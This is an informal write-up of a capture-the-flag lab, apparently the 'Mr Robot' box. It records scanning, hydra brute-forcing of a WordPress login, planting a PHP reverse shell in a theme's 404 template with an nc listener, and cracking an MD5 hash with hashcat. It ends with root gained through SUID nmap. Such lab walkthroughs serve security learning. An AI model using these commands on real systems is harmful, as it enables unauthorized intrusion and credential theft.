sudo nmap -p- -sC -sV -sS -vvvv -A -O -Pn -T5 10.10.103.105
	I wasn't getting anything beforehand so I decided to throw the -T5 at it
We get port 80 and port 443 open, that is it, but I will let the scan keep going
	Alright this guy hates the 'system'
directory buster is showing a lot of stuff... now it is time to go through it all
	Looks like we also figured out that port 22 was closed
There is so much stuff coming through in the dir buster is said screw it and tried robots.txt
Sure enough it did work
	User-agent: *
fsocity.dic
key-1-of-3.txt

Ok, lets go to key-1-of-3.txt in the web browser
	(I also decided to do this the legit way and use nikto)
nikto -h 10.10.103.105
I also tried key 2 or 3 but that didn't work, thought it would be funny if it did
Looking above, remember, we also have the fsocity.dic
Lets download that and take a look at it
	Looks like a wordlist, lets save this
Alright after looking around a lot, and know what i got from the dirbuster I am thinking that the wordlist contains both the username and password
The easiest way to do this is to first bruteforce the username, within dirbuster we did have a wp-login
	hydra -L Downloads/fsocity.dic -p whatever 10.10.103.105 http-post-form "/wp-login/:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.103.105%2Fwp-admin%2F&testcookie=1:F=Invalid username"  
Alright we got a hit
	Elliot is the username
hydra -l Elliot -P Downloads/fsocity.dic 10.10.103.105 http-post-form "/wp-login/:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.103.105%2Fwp-admin%2F&testcookie=1:S=302"
	Noticed we changed the end to S=302 this is because that should be the response you get when you log in
We are in
	Elliot
	ER28-0652
Clicking through we can find some users
	elliot (which we already knew about)
	mich05654
We can also upload files into the wp 
	lets upload a php reverse shell
I downloaded the pentest monkey php reverse shell from the following site
	https://github.com/pentestmonkey/php-reverse-shell
From there I then changed my IP and listening port
Go to plugins, add new
	while that is loading turn on your listening port
	nc -lvnp 4444
OK this started to become a pain and it took too long to load them
	I decided to just change one of the plugins that were already in there
Editing all-in-one-seo-pack/all_in_one_seo_pack.php (inactive)
	From there I deleted that plugin and put the reverse shell in there
From I noticed the site moving very slowly, so I decided to restart the box
This time we will try to customize one of the themes and add the reverse shell in their, hopefully this works
	so we go to appearance and down at the bottom editor
	From there we look to the right side and see a 404 template, this is if the site does not exist
	delete the information in there and upload your shell into it
	now go to a site that does not exist
10.10.122.206/yousuckhaha
	look at your reverse shell
	thats right it worked...
lets go to cd home
ls -la
we see robot
ls -la
we see the flag, but cant get to it, we also see a password file in md5 format
grab that
now use put that hash in a file and then send it to hashcat
hashcat -m 0 hash /usr/share/wordlists/rockyou.txt
alright we have a password
	c3fcd3d76192e4007dfb496cca67e13b:abcdefghijklmnopqrstuvwxyz
Right now our terminal is a raw shell, before moving further lets get it in an actual terminal
	python -c 'import pty; pty.spawn("/bin/bash")'
su robot
abcdefghijklmnopqrstuvwxyz
cat key-2-of-3.txt
	can't do much with sudo...
for the third one i looked at the hint and it says nmap
	i tried a couple of different scans for the localhost but couldnt really move into the different areas
We need to figure out who has the suid bit to be allowed to utilize sudo, or find a vulnerability
	find / -perm -u=s -type f 2>/dev/null
We find a /usr/local/bin/nmap 
lets see if we can find anything on nmap suid
Here is an article on how to do this
	https://pentestlab.blog/2017/09/25/suid-executables/
ls -l /usr/local/bin/nmap
nmap --interactive
!sh
# whoami
whoami
root
# 
ls -la /root
cat /root/key-3-of-3.txt
ALL DONE!!!
